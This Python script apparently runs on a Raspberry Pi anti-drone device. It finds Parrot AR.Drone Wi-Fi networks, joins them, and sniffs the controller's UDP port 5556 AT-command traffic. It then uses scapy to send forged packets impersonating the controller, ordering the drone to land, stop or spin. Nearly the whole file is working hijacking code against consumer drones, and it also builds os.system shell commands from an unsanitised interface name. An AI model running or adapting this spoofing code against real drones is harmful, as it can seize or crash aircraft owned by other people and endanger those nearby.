import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #suppress the 'WARNING: No route found for IPv6 destination'
from scapy.all import *
from wifi import Cell, Scheme
from time import sleep
import serial
import re
import os

def readConfig():
	return (readWhitelist(), readRange())

def readWhitelist():
	with open("/home/pi/Evolo/code/whitelist.txt", "r") as ins:
		whitelist = []
		for line in ins: #ardrone12345678;58:44:98:13:80:6C;03/06/2016
			elements = line.split(";")
			whitelist.append(elements[1]) #second element is the MAC
	return whitelist

def readRange():
	with open("/home/pi/Evolo/code/range.txt", "r") as ins:
		for line in ins:
			return int(line)

ser = None
def startArduino():
	global ser
	serialDev = "/dev/ttyACM0"
	i = 0
	while (not os.path.exists(serialDev)) and i < 10:
		serialDev = "/dev/ttyACM" + str(i)
		i += 1
	if not os.path.exists(serialDev):
		logging.error("ERROR - could not find Arduino connected. Going to 'Moderate' mode")
		ser = None
	else:
		ser = serial.Serial(serialDev, 9600)

def arduinoLCD(message):
	global ser
	if ser != None: #if Arduino is connected
		ser.write(message[:16]) #only write the first 16 characters, since that's the size of the LCD

def readKnobState():
	global ser
	if ser == None:
		return "Moderate" #Arduino not found
	ser.flushInput() #flush serial to get the newest data
	sleep(2) #wait for the data
	modeStr = ""
	while (not modeStr.isdigit()) or int(modeStr) > 3:
		modeStr=ser.readline().rstrip()
		sleep(0.1)
	mode = int(modeStr)
	if mode == 0:
		return "Off"
	if mode == 1:
		return "Aggressive"
	if mode == 2:
		return "Moderate"
	else:
		return "Gracious"

def scanForParrots(interface, whitelist, underattack):
	aps = Cell.all(interface)
	parrots = []
	for ap in aps:
		if ap.address.startswith('90:03:B7') or ap.address.startswith('00:26:7E') or ap.address.startswith('A0:14:3D') or ap.address.startswith('00:12:1C') or ap.address.startswith('58:44:98:13:80'): #if it is a parrot OR my phone (for testing)
			if ap.address not in whitelist and ap.address not in underattack: #only add if new and not on the whitelist
				logging.info("New parrot wifi found: %s", ap.ssid)
				arduinoLCD("New:" + ap.ssid)
				parrots.append(ap)
	return parrots

def connectTo(ap, interface):
	try:
		scheme = Scheme.for_cell(interface, ap.ssid, ap)
		scheme.delete() #otherwise "This scheme already exists" error
		scheme.save()
		scheme.activate() #connect to the Parrot's wifi
	except Exception as detail:
		logging.error("Error while trying to connect to wifi in function connectTo - %s", detail)
		return False
	#reset global variables for sniffing
	global srcMAC, dstMAC, srcIP, dstIP, seqNr
	srcMAC = ""
	dstMAC = ""
	srcIP = ""
	dstIP = ""
	seqNr = ""
	return True

def connectToByMAC(mac, interface):
	aps = Cell.all(interface)
	for apA in aps:
		if(apA.address == mac):
			return connectTo(apA, interface)
        return False


def getWifiDistance(interface, ap):
	aps = Cell.all(interface)
	for apA in aps:
		if(apA.address == ap.address):
			return -1* apA.signal #originally a negative number, closer to 0 - closer the AP
	return 0 #if no longer here, exit

def disconnectFromWifi(interface):
	#apparently python's wifi module can not disconnect from a network, so we have to do it with os commands
	os.system("ifconfig " + interface + " down")
	sleep(0.5)
	os.system("ifconfig " + interface + " up")
	sleep(0.5)
	return True

def getAPsMAC(aps):
	macs = []
	for ap in aps:
		macs.append(ap.address)
	return macs

srcMAC= ""
dstMAC= ""
srcIP = ""
dstIP = ""
seqNr = ""
def sniffParrotCommunication(interface):
	sniff(iface=interface, prn=pkt_callback, filter="udp and port 5556", timeout = 3, count = 10)
	global srcMAC, dstMAC, srcIP, dstIP, seqNr
	return (srcMAC, dstMAC, srcIP, dstIP, seqNr)

def pkt_callback(pkt):
	global srcMAC, dstMAC, srcIP, dstIP, seqNr
	#pkt.show() # debug
	if Raw in pkt and 'AT*' in pkt[Raw].load and srcMAC == "":
		srcMAC= pkt[Ether].src
		dstMAC= pkt[Ether].dst
		srcIP = pkt[IP].src
		dstIP = pkt[IP].dst
		#parse the sequence number
		p = re.compile("=(\d+),")
		m = p.search(pkt[Raw].load)
		seqNr = int(m.group(1))

def sendSpoofedParrotPacket(command, interface, srcMAC, dstMAC, srcIP, dstIP, seqNr, count):
	part1 = ""
	part2 = ""
	if command == "land":
		part1 = "REF"
		part2 = "290717696"
	elif command == "stop":
		part1 = "PCMD_MAG"
		part2 = "0,0,0,0,0,0,0"
	elif command == "warn": #slowly rotate
		part1 = "PCMD_MAG"
		part2 = "0,0,0,0,-50000000,0,0" #"1,0,0,0,1" #last value is the angular speed [-1,1] -1082130432
	elif command == "release":
		part1 = "PCMD_MAG"
		part2 = "0,0,0,0,0,0,0"
		seqNr = -1000000 #so it will be 1 in the end
		count = 1

	for i in range(1, count+1):
		payload = "AT*" + part1 + "=" + str(seqNr+i+1000000) + "," + part2 + "\r"
		logging.debug("Sending the following payload: %s",payload)
		spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=5556, dport=5556) / payload
		sendp(spoofed_packet, iface=interface)
		sleep(0.3)

